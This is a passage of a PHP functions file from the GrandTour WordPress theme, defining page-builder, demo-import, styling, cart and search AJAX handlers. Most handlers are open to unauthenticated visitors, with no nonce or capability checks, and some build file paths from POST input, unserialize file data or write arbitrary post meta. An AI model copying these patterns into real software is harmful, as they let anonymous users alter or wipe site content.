			   newPoint = (el.val() - el.attr("min")) / (el.attr("max") - el.attr("min"));
			   el.next("output").text(el.val());
			 })
			 .trigger('change');
			
			jQuery("#save_<?php echo esc_js($_GET['rel']); ?>").click(function(){
				//Save undo data to localstorage
				ppbAddHistory('undo');
			
				tinyMCE.triggerSave();
			
			    var targetItem = '<?php echo esc_js($_GET['rel']); ?>';
			    var parentInline = jQuery(this).attr('data-parent');
			    var currentItemData = jQuery('#'+targetItem).find('.ppb_setting_data').attr('value');
			    var currentShortcode = jQuery('#'+parentInline).attr('data-shortcode');
			    
			    var itemData = {};
			    itemData.id = targetItem;
			    itemData.shortcode = currentShortcode;
			    
			    jQuery("#"+parentInline+" :input.ppb_input").each(function(){
			     	if(typeof jQuery(this).attr('id') != 'undefined')
			     	{	
			    	 	if(jQuery(this).attr('multiple') != 'multiple')
			     		{
			    	 		itemData[jQuery(this).attr('id')] = encodeURI(jQuery(this).attr('value'));
			    	 	}
			    	 	else
			    	 	{
				    	 	itemData[jQuery(this).attr('id')] = jQuery(this).val();
			    	 	}
			    	 	
				    	 if(jQuery(this).attr('data-attr') == 'title')
				    	 {
				    	 	//Set saved module title
				    	 	var shortcodeName = jQuery('#'+targetItem).find('.title').find('.shortcode_title').html();
				    	 	
				    	 	var updatedShortcodeTitle = '<div class="shortcode_title">'+shortcodeName+'</div>'+decodeURI(jQuery(this).attr('value'));
				    	 	
				    	  	jQuery('#'+targetItem).find('.title').html(updatedShortcodeTitle);
				    	  	
				    	  	if(jQuery('#'+targetItem).find('.ppb_unsave').length==0)
				    	  	{
				    	  		ppbSetUnsaveStatus();
				    	  	}
				    	 }
			     	}
			    });
			    
			    var currentItemDataJSON = JSON.stringify(itemData);
			    jQuery('#'+targetItem).data('ppb_setting', currentItemDataJSON);
			    
			    //If in live mode
				if(isLiveMode())
				{
					//Save all content
					ppbSaveAll();
					
					//Set preview frame data
					ppbSetPreviewData();
						
					//Reload preview frame
					ppbReloadPreview();
				}
			    
			    refreshBuilderBlockEvents();
			    
			    jQuery.fancybox.close();
			});
			
			jQuery.fancybox.hideLoading();
		});
		</script>
<?php
		}
	}
	
	die();
}

/**
*	Setup AJAX portfolio content builder preview function
**/
add_action('wp_ajax_grandtour_ppb_preview', 'grandtour_ppb_preview');
add_action('wp_ajax_nopriv_grandtour_ppb_preview', 'grandtour_ppb_preview');

function grandtour_ppb_preview() {
	if(is_admin() && isset($_GET['page_id']) && !empty($_GET['page_id']) && isset($_GET['rel']) && !empty($_GET['rel']))
	{
		$page_id = $_GET['page_id'];
		$page_title = $_GET['title'];
		$ppb_form_item = $_GET['rel'];
		$preview_url = get_permalink($page_id);
		$preview_url.= '?ppb_preview=true&rel='.$ppb_form_item;
?>
	<iframe id="ppb_preview_frame" src="<?php echo esc_url($preview_url); ?>"></iframe>
<?php
	}
	die();
}

/**
*	Setup AJAX portfolio content builder preview page function
**/
add_action('wp_ajax_grandtour_ppb_preview_page', 'grandtour_ppb_preview_page');
add_action('wp_ajax_nopriv_grandtour_ppb_preview_page', 'grandtour_ppb_preview_page');

function grandtour_ppb_preview_page() {
	if(is_admin() && isset($_GET['page_id']) && !empty($_GET['page_id']))
	{
		$page_id = $_GET['page_id'];
		$page_title = get_the_title($page_id);
		$preview_url = get_permalink($page_id);
		$preview_url.= '?ppb_preview_page=true';
?>
	<iframe id="ppb_preview_frame" src="<?php echo esc_url($preview_url); ?>"></iframe>
<?php
	}
	die();
}


/**
*	Setup content builder set data for preview page function
**/
add_action('wp_ajax_grandtour_ppb_preview_page_set_data', 'grandtour_ppb_preview_page_set_data');
add_action('wp_ajax_nopriv_grandtour_ppb_preview_page_set_data', 'grandtour_ppb_preview_page_set_data');

function grandtour_ppb_preview_page_set_data() {
	
	if(is_admin() && isset($_POST['page_id']) && !empty($_POST['page_id']))
	{
		$page_id = $_POST['page_id'];
		$data = mb_convert_encoding($_POST['data'],'UTF-8','UTF-8');
		$data = json_decode($_POST['data']);
		$data_order = $_POST['data_order'];
		
		//Set data order to WordPress cache
		set_transient('grandtour_'.$page_id.'_data_order', $data_order, 3600 );
		
		//Convert order data to array
		$ppb_form_item_arr = array();
		if(!empty($data_order))
		{
		    $ppb_form_item_arr = explode(',', $data_order);
		}
		
		if(isset($ppb_form_item_arr[0]) && !empty($ppb_form_item_arr[0]))
		{
		    $data_arr = array();
		    $size_arr = array();
		
		    foreach($ppb_form_item_arr as $key => $ppb_form_item)
		    {
		    	if(isset($_POST[$ppb_form_item.'_data']))
		    	{
			    	$data_arr[$ppb_form_item] = $_POST[$ppb_form_item.'_data'];
			    	$size_arr[$ppb_form_item] = $_POST[$ppb_form_item.'_size'];
		    	}
		    }
		}
		
		set_transient('grandtour_'.$page_id.'_data', $data_arr, 3600 );
		set_transient('grandtour_'.$page_id.'_size', $size_arr, 3600 );
?>
	
<?php
	}
	die();
}


/**
*	Setup preview demo page function
**/
add_action('wp_ajax_grandtour_ppb_demo_preview', 'grandtour_ppb_demo_preview');
add_action('wp_ajax_nopriv_grandtour_ppb_demo_preview', 'grandtour_ppb_demo_preview');

function grandtour_ppb_demo_preview() {
	if(is_admin() && isset($_POST['key']) && !empty($_POST['key']))
	{
		require_once get_template_directory() . "/lib/contentbuilder.shortcode.lib.php";
		
		if(isset($ppb_shortcodes[$_POST['key']]))
		{
			$page_title = $ppb_shortcodes[$_POST['key']]['title'];
			$preview_url = $ppb_shortcodes[$_POST['key']]['url'];
?>
	<div class="ppb_inline_wrap preview">
	    <h2><?php esc_html_e('Preview', 'grandtour' ); ?> <?php echo urldecode($page_title); ?></h2>
	    <a class="button button-primary" href="javascript:;" onClick="jQuery.fancybox.close();"><?php esc_html_e('Close', 'grandtour' ); ?></a>
	</div>	
	<iframe id="ppb_preview_frame" src="<?php echo esc_url($preview_url); ?>"></iframe>
<?php
		}
	}
	die();
}


/**
*	Setup live preview element function
**/
add_action('wp_ajax_grandtour_ppb_get_live_preview', 'grandtour_ppb_get_live_preview');
add_action('wp_ajax_nopriv_grandtour_ppb_get_live_preview', 'grandtour_ppb_get_live_preview');

function grandtour_ppb_get_live_preview() {

	if(is_admin() && isset($_POST['data']) && !empty($_POST['data']) && isset($_POST['size']) && !empty($_POST['size']))
	{
		$ppb_form_item = $_POST['rel'];
		$ppb_form_item_size = $_POST['size'];
		$ppb_form_item_data = $_POST['data'];
		$ppb_form_item_data = mb_convert_encoding($ppb_form_item_data,'UTF-8','UTF-8');
		$ppb_form_item_data_obj = json_decode(stripslashes($ppb_form_item_data));
	    $ppb_shortcode_content_name = $_GET['shortcode'];
	    $ppb_shortcode_code = '';
	    
	    /*print '<pre>';
	    print_r($ppb_form_item_data_obj);
	    print '</pre>';*/
	    
	    $ppb_shortcodes = array();
		require_once get_template_directory() . "/lib/contentbuilder.shortcode.lib.php";
	    
	    if(isset($ppb_form_item_data_obj->$ppb_shortcode_content_name))
	    {
	        $ppb_shortcode_code = '['.$ppb_form_item_data_obj->shortcode.' size="'.$ppb_form_item_size.'" ';
	        
	        //Get shortcode title
	        $ppb_shortcode_title_name = $ppb_form_item_data_obj->shortcode.'_title';
	        if(isset($ppb_form_item_data_obj->$ppb_shortcode_title_name))
	        {
	        	$ppb_shortcode_code.= 'title="'.esc_attr(rawurldecode($ppb_form_item_data_obj->$ppb_shortcode_title_name), ENT_QUOTES, "UTF-8").'" ';
	        }
	        
	        //Get shortcode attributes
	        if(isset($ppb_shortcodes[$ppb_form_item_data_obj->shortcode]))
	        {
	        	$ppb_shortcode_arr = $ppb_shortcodes[$ppb_form_item_data_obj->shortcode];
	        	
	        	foreach($ppb_shortcode_arr['attr'] as $attr_name => $attr_item)
	        	{
	        		$ppb_shortcode_attr_name = $ppb_form_item_data_obj->shortcode.'_'.$attr_name;
	        		
	        		if(isset($ppb_form_item_data_obj->$ppb_shortcode_attr_name))
	        		{
	        			$ppb_shortcode_code.= $attr_name.'="'.esc_attr(rawurldecode($ppb_form_item_data_obj->$ppb_shortcode_attr_name)).'" ';
	        		}
	        	}
	        }
	
	        $ppb_shortcode_code.= ']'.rawurldecode($ppb_form_item_data_obj->$ppb_shortcode_content_name).'[/'.$ppb_form_item_data_obj->shortcode.']';
	    }
	    else
	    {
	        $ppb_shortcode_code = '['.$ppb_form_item_data_obj->shortcode.' size="'.$ppb_form_item_size.'" ';
	        
	        //Get shortcode title
	        $ppb_shortcode_title_name = $ppb_form_item_data_obj->shortcode.'_title';
	        if(isset($ppb_form_item_data_obj->$ppb_shortcode_title_name))
	        {
	        	$ppb_shortcode_code.= 'title="'.esc_attr(rawurldecode($ppb_form_item_data_obj->$ppb_shortcode_title_name), ENT_QUOTES, "UTF-8").'" ';
	        }
	        
	        //Get shortcode attributes
	        if(isset($ppb_shortcodes[$ppb_form_item_data_obj->shortcode]))
	        {
	        	$ppb_shortcode_arr = $ppb_shortcodes[$ppb_form_item_data_obj->shortcode];
	        	
	        	foreach($ppb_shortcode_arr['attr'] as $attr_name => $attr_item)
	        	{
	        		$ppb_shortcode_attr_name = $ppb_form_item_data_obj->shortcode.'_'.$attr_name;
	        		
	        		if(isset($ppb_form_item_data_obj->$ppb_shortcode_attr_name))
	        		{
	        			$ppb_shortcode_code.= $attr_name.'="'.esc_attr(rawurldecode($ppb_form_item_data_obj->$ppb_shortcode_attr_name)).'" ';
	        		}
	        	}
	        }
	        
	        $ppb_shortcode_code.= ']';
	    }
	    
	    echo do_shortcode($ppb_shortcode_code);
	}
	die();
}


/**
*	Save current as template function
**/
add_action('wp_ajax_grandtour_ppb_set_template', 'grandtour_ppb_set_template');
add_action('wp_ajax_nopriv_grandtour_ppb_set_template', 'grandtour_ppb_set_template');

function grandtour_ppb_set_template() {
	if(is_admin() && isset($_POST['template_name']) && !empty($_POST['template_name']) && isset($_GET['page_id']) && !empty($_GET['page_id']) && strlen($_POST['template_name']) >= 3)
	{
		//Get page ID
		$page_id = $_GET['page_id'];
		
		//get list of my templates in array
		$my_current_templates = get_option(GRANDTOUR_SHORTNAME."_my_templates");
		
		//set new template ID and name
		$new_template_name = sanitize_text_field($_POST['template_name']);
		$new_template_id = $page_id.'_'.time();
		$my_current_templates[$new_template_id] = $new_template_name;
		
		//Update my template list
		update_option( GRANDTOUR_SHORTNAME."_my_templates", $my_current_templates );
		
		//Save current page builder content to my template
		$ppb_form_data_order = get_post_meta($page_id, 'ppb_form_data_order');
		$export_options_arr = array();

		if(!empty($ppb_form_data_order))
		{
		    $export_options_arr['ppb_form_data_order'] = $ppb_form_data_order;

		    //Get each builder module data
		    $ppb_form_item_arr = explode(',', $ppb_form_data_order[0]);
		
		    foreach($ppb_form_item_arr as $key => $ppb_form_item)
		    {
		    	$ppb_form_item_data = get_post_meta($page_id, $ppb_form_item.'_data');
		    	$export_options_arr[$ppb_form_item.'_data'] = $ppb_form_item_data;
		    	
		    	$ppb_form_item_size = get_post_meta($page_id, $ppb_form_item.'_size');
		    	$export_options_arr[$ppb_form_item.'_size'] = $ppb_form_item_size;
		    }
		}
		
		update_option( GRANDTOUR_SHORTNAME."_template_".$new_template_id, json_encode($export_options_arr) );
		
		//return template ID
		echo intval($new_template_id);
	}
	
	die();
}


/**
*	Remove current template function
**/
add_action('wp_ajax_grandtour_ppb_remove_template', 'grandtour_ppb_remove_template');
add_action('wp_ajax_nopriv_grandtour_ppb_remove_template', 'grandtour_ppb_remove_template');

function grandtour_ppb_remove_template() {
	if(is_admin() && isset($_GET['template_id']) && !empty($_GET['template_id']))
	{
		//get list of my templates in array
		$my_current_templates = get_option(GRANDTOUR_SHORTNAME."_my_templates");
		$template_id = $_GET['template_id'];
		
		if(isset($my_current_templates[$template_id]))
		{
			//Remove template from array
			unset($my_current_templates[$template_id]);
			
			//Remove from my template list
			update_option( GRANDTOUR_SHORTNAME."_my_templates", $my_current_templates );
			
			//Remove template data
			delete_option( GRANDTOUR_SHORTNAME."_template_".$template_id );
			
			//display to AJAX response
			echo 1;
		}
	}
	
	die();
}


/**
*	Save page builder custom fields
**/
add_action('wp_ajax_grandtour_ppb_save_page_builder', 'grandtour_ppb_save_page_builder');
add_action('wp_ajax_nopriv_grandtour_ppb_save_page_builder', 'grandtour_ppb_save_page_builder');

function grandtour_ppb_save_page_builder() {
	if(is_admin() && isset($_POST['data_order']) && isset($_GET['page_id']) && !empty($_GET['page_id']))
	{
		$page_id = $_GET['page_id'];
		
		 //Get builder item
	    $ppb_form_data_order = $_POST['data_order'];
	    $ppb_form_item_arr = array();
	    
	    if(isset($ppb_form_data_order))
	    {
	    	$ppb_form_item_arr = explode(',', $ppb_form_data_order);
	    }
	    
	    if(!empty($ppb_form_item_arr))
	    {
	    	update_post_meta($page_id, 'ppb_form_data_order', $ppb_form_data_order);
	    
	    	foreach($ppb_form_item_arr as $key => $ppb_form_item)
	    	{
	    		if(isset($_POST[$ppb_form_item.'_data']) && $_POST[$ppb_form_item.'_data'] != 'undefined')
		    	{
	    			update_post_meta($page_id, $ppb_form_item.'_data', $_POST[$ppb_form_item.'_data']);
	    		}
	    		
	    		if(isset($_POST[$ppb_form_item.'_size']) && $_POST[$ppb_form_item.'_size'] != 'undefined')
	    		{
	    			update_post_meta($page_id, $ppb_form_item.'_size', $_POST[$ppb_form_item.'_size']);
	    		}
	    	}
	    }
	}
	
	die();
}


/**
*	Save page custom fields
**/
add_action('wp_ajax_grandtour_ppb_save_page_custom_field', 'grandtour_ppb_save_page_custom_field');
add_action('grandtour_ppb_save_page_custom_field', 'grandtour_ppb_save_page_custom_field');

function grandtour_ppb_save_page_custom_field() {
	if(is_admin() && isset($_GET['page_id']) && !empty($_GET['page_id']) && isset($_POST['field']) && !empty($_POST['field']) && isset($_POST['data']))
	{
		echo intval($page_id);
		$page_id = $_GET['page_id'];
		update_post_meta($page_id, $_POST['field'], $_POST['data']);
	}
	
	die();
}

/**
*	Setup one click importer function
**/
add_action('wp_ajax_grandtour_import_demo_content', 'grandtour_import_demo_content');
add_action('wp_ajax_nopriv_grandtour_import_demo_content', 'grandtour_import_demo_content');

function grandtour_import_demo_content() {

	if(is_admin() && isset($_POST['demo']) && !empty($_POST['demo']))
	{
	    if ( !defined('WP_LOAD_IMPORTERS') ) define('WP_LOAD_IMPORTERS', true);
	    
	    // Load Importer API
	    require_once ABSPATH . 'wp-admin/includes/import.php';
	
	    if ( ! class_exists( 'WP_Importer' ) ) {
	        $class_wp_importer = ABSPATH . 'wp-admin/includes/class-wp-importer.php';
	        if ( file_exists( $class_wp_importer ) )
	        {
	            require_once $class_wp_importer;
	        }
	    }
	
	    if ( ! class_exists( 'WP_Import' ) ) {
	    	$class_wp_importer = get_template_directory() ."/modules/import/wordpress-importer.php";

	        if ( file_exists( $class_wp_importer ) )
	            require_once $class_wp_importer;
	    }
	
	    $import_files = array();
	    $page_on_front ='';
	    
	    switch($_POST['demo'])
	    {
		    case 1:
		    default:
			    //Create empty menu first before importing
			    $footer_menu_exists = wp_get_nav_menu_object('Footer Menu');
			    if(!$footer_menu_exists)
			    {
				    $footer_menu_id = wp_create_nav_menu('Footer Menu');
			    }
			    
			    $main_left_menu_exists = wp_get_nav_menu_object('Main Left Menu');
			    if(!$main_left_menu_exists)
			    {
				    $main_left_menu_id = wp_create_nav_menu('Main Left Menu');
			    }
			    
			    $main_right_menu_exists = wp_get_nav_menu_object('Main Right Menu');
			    if(!$main_right_menu_exists)
			    {
				    $main_right_menu_id = wp_create_nav_menu('Main Right Menu');
			    }
			    
			    $main_menu_exists = wp_get_nav_menu_object('Main Menu');
			    if(!$main_menu_exists)
			    {
				    $main_menu_id = wp_create_nav_menu('Main Menu');
			    }
			    
			    $top_menu_exists = wp_get_nav_menu_object('Top Bar Menu');
			    if(!$top_menu_exists)
			    {
				    $top_menu_id = wp_create_nav_menu('Top Bar Menu');
			    }
			break;
			
			case 2:
				$main_menu_exists = wp_get_nav_menu_object('Main Menu');
			    if(!$main_menu_exists)
			    {
				    $main_menu_id = wp_create_nav_menu('Main Menu');
			    }
			break;
	    }

		//Check import selected demo
	    if ( class_exists( 'WP_Import' ) ) 
	    { 
	    	switch($_POST['demo'])
	    	{
		    	case 1:
		    	default:
		    		//Check if install Woocommerce
		    		if(!class_exists('Woocommerce'))
					{
		    			$import_filepath = get_template_directory() ."/cache/demos/xml/demo1/1.xml" ;
		    		}
		    		else
		    		{
			    		$import_filepath = get_template_directory() ."/cache/demos/xml/demo1/1_woo.xml" ;
		    		}
		    		
		    		$styling_file = get_template_directory() . "/cache/demos/xml/demo1/1.dat";
		    		$import_widget_filepath = get_template_directory() ."/cache/demos/xml/demo1/1.wie" ;
		    		
		    		$page_on_front = 3102; //Demo Homepage ID
		    		$oldurl = 'http://themes.themegoods.com/grandtour/demo';
		    	break;
		    	
		    	case 2:
		    		$import_filepath = get_template_directory() ."/cache/demos/xml/demo2/2.xml" ;
		    		$styling_file = get_template_directory() . "/cache/demos/xml/demo2/2.dat";
		    		$import_widget_filepath = get_template_directory() ."/cache/demos/xml/demo2/2.wie" ;
		    		
		    		$page_on_front = 3557; //Demo Homepage ID
		    		$oldurl = 'http://themes.themegoods.com/grandtour/demo2';
		    	break;
	    	}
			
			//Run and download demo contents
			$wp_import = new WP_Import();
	        $wp_import->fetch_attachments = true;
	        $wp_import->import($import_filepath);
	        
	        //Remove default Hello World post
	        wp_delete_post(1);
	    }
	    
	    //Setup default front page settings.
	    update_option('show_on_front', 'page');
	    update_option('page_on_front', $page_on_front);
	    
	    //Set default custom menu settings
	    $locations = get_theme_mod('nav_menu_locations');
		switch($_POST['demo'])
	    {
		    case 1:
		    default:
		    	$locations['primary-menu'] = $main_menu_id;
				$locations['top-menu'] = $top_menu_id;
				$locations['side-menu'] = $main_menu_id;
				$locations['footer-menu'] = $footer_menu_id;
		    break;
		    
		    case 2:
		    	$locations['primary-menu'] = $main_menu_id;
				$locations['side-menu'] = $main_menu_id;
				$locations['footer-menu'] = $main_menu_id;
		    break;
	    }
		set_theme_mod( 'nav_menu_locations', $locations );

		if(file_exists($styling_file))
		{
			WP_Filesystem();
			$wp_filesystem = grandtour_get_wp_filesystem();
			$styling_data = $wp_filesystem->get_contents($styling_file);
			$styling_data_arr = unserialize($styling_data);
			
			if(isset($styling_data_arr['mods']) && is_array($styling_data_arr['mods']))
			{	
				// Get menu locations and save to array
				$locations = get_theme_mod('nav_menu_locations');
				$save_menus = array();
				foreach( $locations as $key => $val ) 
				{
					$save_menus[$key] = $val;
				}
			
				//Remove all theme customizer
				remove_theme_mods();
				
				//Re-add the menus
				set_theme_mod('nav_menu_locations', array_map( 'absint', $save_menus ));
			
				foreach($styling_data_arr['mods'] as $key => $styling_mod)
				{
					if(!is_array($styling_mod))
					{
						set_theme_mod( $key, $styling_mod );
					}
				}
			}
		}
		
		//Import widgets
		if(file_exists($import_widget_filepath))
		{
			// Get file contents and decode
			WP_Filesystem();
			$wp_filesystem = grandtour_get_wp_filesystem();
			$data = $wp_filesystem->get_contents($import_widget_filepath);
			$data = json_decode( $data );
		
			// Import the widget data
			// Make results available for display on import/export page
			$widget_import_results = grandtour_import_data( $data );
		}
		
		//Import Revolution Slider if activate
		if(class_exists('RevSlider'))
		{
			$slider_array = array();
			
			switch($_POST['demo'])
	    	{
		    	case 1:
		    	default:
		    		$slider_array = array(
		    			get_template_directory() ."/cache/demos/xml/demo1/home-4-slider.zip",
		    		);
		    	break;
		    	
		    	case 2:
		    		$slider_array = array(
		    			get_template_directory() ."/cache/demos/xml/demo2/home-slider-1.zip",
		    		);
		    	break;
	    	}
	    	
	    	if(!empty($slider_array))
	    	{
		    	require_once ABSPATH . 'wp-admin/includes/file.php';
				$obj_revslider = new RevSlider();
				
				foreach($slider_array as $revslider_filepath)
				{
					$obj_revslider->importSliderFromPost(true,true,$revslider_filepath);
				}
			}
		}
		
		//Change all URLs from demo URL to localhost
		$update_options = array ( 0 => 'content', 1 => 'excerpts', 2 => 'links', 3 => 'attachments', 4 => 'custom', 5 => 'guids', );
		$newurl = esc_url( site_url() ) ;
		grandtour_update_urls($update_options, $oldurl, $newurl);
		
		//Remove unwanted options
		//Remove demo logo
		remove_theme_mod('tg_favicon');
		remove_theme_mod('tg_retina_logo');
		remove_theme_mod('tg_retina_transparent_logo');
		
		//Refresh rewrite rules
		flush_rewrite_rules();
	    
		exit();
	}
}

/**
*	Setup get styling function
**/
add_action('wp_ajax_grandtour_get_styling', 'grandtour_get_styling');
add_action('wp_ajax_nopriv_grandtour_get_styling', 'grandtour_get_styling');

function grandtour_get_styling() {
	if(is_admin() && isset($_POST['styling']) && !empty($_POST['styling']))
	{
		$styling_file = get_template_directory() . "/cache/demos/customizer/settings/".$_POST['styling'].".dat";

		if(file_exists($styling_file))
		{
			WP_Filesystem();
			$wp_filesystem = grandtour_get_wp_filesystem();
			$styling_data = $wp_filesystem->get_contents($styling_file);
			$styling_data_arr = unserialize($styling_data);
			
			if(isset($styling_data_arr['mods']) && is_array($styling_data_arr['mods']))
			{	
				// Get menu locations and save to array
				$locations = get_theme_mod('nav_menu_locations');
				$save_menus = array();
				foreach( $locations as $key => $val ) 
				{
					$save_menus[$key] = $val;
				}
			
				//Remove all theme customizer
				remove_theme_mods();
				
				//Re-add the menus
				set_theme_mod('nav_menu_locations', array_map( 'absint', $save_menus ));
			
				foreach($styling_data_arr['mods'] as $key => $styling_mod)
				{
					if(!is_array($styling_mod))
					{
						set_theme_mod( $key, $styling_mod );
					}
				}
			}
		    
			exit();
		}
	}
}


/**
*	Setup custom CSS function
**/
add_action('wp_ajax_grandtour_custom_css', 'grandtour_custom_css');
add_action('wp_ajax_nopriv_grandtour_custom_css', 'grandtour_custom_css');

function grandtour_custom_css() {
	get_template_part("/modules/custom_css");

	die();
}

/**
*	Setup responsive CSS function
**/
add_action('wp_ajax_grandtour_responsive_css', 'grandtour_responsive_css');
add_action('wp_ajax_nopriv_grandtour_responsive_css', 'grandtour_responsive_css');

function grandtour_responsive_css() {
	get_template_part("/modules/responsive_css");

	die();
}

/**
*	End responsive CSS function
**/


/**
*	Setup custom script function
**/
add_action('wp_ajax_grandtour_script_animate_circle_shortcode', 'grandtour_script_animate_circle_shortcode');
add_action('wp_ajax_nopriv_grandtour_script_animate_circle_shortcode', 'grandtour_script_animate_circle_shortcode');

function grandtour_script_animate_circle_shortcode() {
	get_template_part("/modules/script/script-animate-circle-shortcode");

	die();
}

add_action('wp_ajax_grandtour_script_animate_counter_shortcode', 'grandtour_script_animate_counter_shortcode');
add_action('wp_ajax_nopriv_grandtour_script_animate_counter_shortcode', 'grandtour_script_animate_counter_shortcode');

function grandtour_script_animate_counter_shortcode() {
	get_template_part("/modules/script/script-animate-counter-shortcode");

	die();
}

add_action('wp_ajax_grandtour_script_audio_shortcode', 'grandtour_script_audio_shortcode');
add_action('wp_ajax_nopriv_grandtour_script_audio_shortcode', 'grandtour_script_audio_shortcode');

function grandtour_script_audio_shortcode() {
	get_template_part("/modules/script/script-audio-shortcode");

	die();
}

add_action('wp_ajax_grandtour_script_demo', 'grandtour_script_demo');
add_action('wp_ajax_nopriv_grandtour_script_demo', 'grandtour_script_demo');

function grandtour_script_demo() {
	get_template_part("/modules/script/script-demo");

	die();
}

/**
*	Setup add product to cart function
**/
add_action('wp_ajax_grandtour_add_to_cart', 'grandtour_add_to_cart');
add_action('wp_ajax_nopriv_grandtour_add_to_cart', 'grandtour_add_to_cart');

function grandtour_add_to_cart() {
	if(isset($_GET['product_id']) && !empty($_GET['product_id']) && class_exists('Woocommerce'))
	{
		$product_ID = $_GET['product_id'];
		
		//Check if variable product
		$obj_product = wc_get_product($product_ID);
		$woocommerce = grandtour_get_woocommerce();
		
		if($obj_product->is_type('variable')) 
		{
			//Get all product variation
			$args = array(
			 'post_type'     => 'product_variation',
			 'post_status'   => array( 'private', 'publish' ),
			 'numberposts'   => -1,
			 'orderby'       => 'menu_order',
			 'order'         => 'ASC',
			 'post_parent'   => $product_ID
			);
			$variations = get_posts( $args ); 
													 
			foreach ($variations as $variation)
			{
				//Get variation ID
				$variation_ID = $variation->ID;
				
				if(isset($_POST[$variation_ID]) && !empty($_POST[$variation_ID]))
				{
					$woocommerce->cart->add_to_cart($product_ID, intval($_POST[$variation_ID]), $variation_ID);
				}
			}
		}
		else
		{
			$woocommerce->cart->add_to_cart($product_ID);
		}
	}
	
	die();
}

/**
*	End add product to cart function
**/

add_action('wp_ajax_grandtour_script_gallery_flexslider', 'grandtour_script_gallery_flexslider');
add_action('wp_ajax_nopriv_grandtour_script_gallery_flexslider', 'grandtour_script_gallery_flexslider');

function grandtour_script_gallery_flexslider() {
	get_template_part("/modules/script/script-gallery-flexslider");

	die();
}

add_action('wp_ajax_grandtour_script_gridrotator', 'grandtour_script_gridrotator');
add_action('wp_ajax_nopriv_grandtour_script_gridrotator', 'grandtour_script_gridrotator');

function grandtour_script_gridrotator() {
	get_template_part("/modules/script/script-gridrotator");

	die();
}

add_action('wp_ajax_grandtour_script_jwplayer_shortcode', 'grandtour_script_jwplayer_shortcode');
add_action('wp_ajax_nopriv_grandtour_script_jwplayer_shortcode', 'grandtour_script_jwplayer_shortcode');

function grandtour_script_jwplayer_shortcode() {
	get_template_part("/modules/script/script-jwplayer-shortcode");

	die();
}

add_action('wp_ajax_grandtour_script_map_shortcode', 'grandtour_script_map_shortcode');
add_action('wp_ajax_nopriv_grandtour_script_map_shortcode', 'grandtour_script_map_shortcode');

function grandtour_script_map_shortcode() {
	get_template_part("/modules/script/script-map-shortcode");

	die();
}

add_action('wp_ajax_grandtour_script_self_hosted_video', 'grandtour_script_self_hosted_video');
add_action('wp_ajax_nopriv_grandtour_script_self_hosted_video', 'grandtour_script_self_hosted_video');

function grandtour_script_self_hosted_video() {
	get_template_part("/modules/script/script-self-hosted-video");

	die();
}

add_action('wp_ajax_grandtour_script_slider_flexslider', 'grandtour_script_slider_flexslider');
add_action('wp_ajax_nopriv_grandtour_script_slider_flexslider', 'grandtour_script_slider_flexslider');

function grandtour_script_slider_flexslider() {
	get_template_part("/modules/script/script-slider-flexslider");

	die();
}

add_action('wp_ajax_kirki_dynamic_css', 'kirki_dynamic_css');
add_action('wp_ajax_nopriv_kirki_dynamic_css', 'kirki_dynamic_css');

function kirki_dynamic_css() {
	$kirki = grandtour_get_kirki();

	die();
}

add_action('wp_ajax_grandtour_ajax_search', 'grandtour_ajax_search');
add_action('wp_ajax_nopriv_grandtour_ajax_search', 'grandtour_ajax_search');

function grandtour_ajax_search() {
	get_template_part("/modules/script/script-ajax-search");

	die();
}

/**
*	Setup AJAX search function
**/
add_action('wp_ajax_grandtour_ajax_search_result', 'grandtour_ajax_search_result');
add_action('wp_ajax_nopriv_grandtour_ajax_search_result', 'grandtour_ajax_search_result');

function grandtour_ajax_search_result() 
{
	$wpdb = grandtour_get_wpdb();
	
	if(!isset($_POST['keyword']))
	{
		$_POST['keyword'] = $_POST['s'];
	}

	if (strlen($_POST['keyword'])>0) {
		$query_string.= grandtour_get_initial_tour_query();
		
		parse_str($query_string, $args);
    
	    if(isset($_POST['keyword']) && !empty($_POST['keyword']))
	    {  
	    	/*$args['tax_query'][] = array(
			    array(
			        'taxonomy' => 'tourtag',
			        'field' => 'name',
			        'terms' => $_POST['keyword']
			    )
			);*/
	        $args['s'] = $_POST['keyword'];
	    }
	    
	    if(isset($_POST['month']) && !empty($_POST['month']))
	    { 
	    	$args['meta_query'][] = array(
	        	'key' => 'tour_months',
	        	'value' => $_POST['month'],
	        	'type' => 'CHAR',
	        	'compare' => 'LIKE'
	        );
	    }
	    
	    if(isset($_POST['sort_by']) && !empty($_POST['sort_by']))
	    { 
	    	switch($_POST['sort_by'])
	    	{
		    	case 'date':
		    	default:
		    		$args['orderby'] = 'post_date';
		    		$args['order'] = 'DESC';
		    	break;
		    	
		    	case 'price_low':
		    		$args['orderby'] = 'meta_value_num';
		    		$args['meta_key'] = 'tour_price';
		    		$args['order'] = 'ASC';
		    	break;
		    	
		    	case 'price_high':
		    		$args['orderby'] = 'meta_value_num';
		    		$args['meta_key'] = 'tour_price';
		    		$args['order'] = 'DESC';
		    	break;
		    	
		    	case 'name':
		    		$args['orderby'] = 'post_title';
		    		$args['order'] = 'ASC';
		    	break;
		    	
		    	case 'popular':
		    		$args['orderby'] = 'post_views';
		    		$args['order'] = 'DESC';
		    	break;
	    	}
	    }
	    
	    $args['posts_per_page'] = 10;
	    
	    query_posts($args);
	    echo '<ul>';
	 	
	 	if (have_posts()) : while (have_posts()) : the_post();
	 		
	 		$tour_ID = get_the_ID();
	 	
	 		//Get tour price
			$tour_price = get_post_meta($tour_ID, 'tour_price', true);
	 		
			echo '<li>';
			echo '<a href="'.get_permalink($tour_ID).'"><h7>'.get_the_title().'</h7>';
			
			if(!empty($tour_price))
			{
				$tour_discount_price = get_post_meta($post->ID, 'tour_discount_price', true);
				if(!empty($tour_discount_price))
				{
					$tour_price = $tour_discount_price;
				}
				
				echo '<span class="ajax_price">'.grandtour_format_tour_price($tour_price).'</span>';
			}
			
			echo '</a>';
			echo '</li>';
	
		endwhile;
		endif;
		
		echo '</ul>';
	}
	else 
	{
		echo '';
	}
	die();

}
/**
*	End theme custom AJAX calls handler
**/

/**
*	End custom script function
**/


if(GRANDTOUR_THEMEDEMO)
{
	function grandtour_add_my_query_var( $link ) 
	{
		$arr_params = array();
	    
	    if(isset($_GET['topbar'])) 
		{
			$arr_params['topbar'] = $_GET['topbar'];
		}
		
		if(isset($_GET['menu'])) 
		{
			$arr_params['menu'] = $_GET['menu'];
		}
		
		if(isset($_GET['frame'])) 
		{
			$arr_params['frame'] = $_GET['frame'];
		}
		
		if(isset($_GET['frame_color'])) 
		{
			$arr_params['frame_color'] = $_GET['frame_color'];
		}
		
		if(isset($_GET['boxed'])) 
		{
			$arr_params['boxed'] = $_GET['boxed'];
		}
		
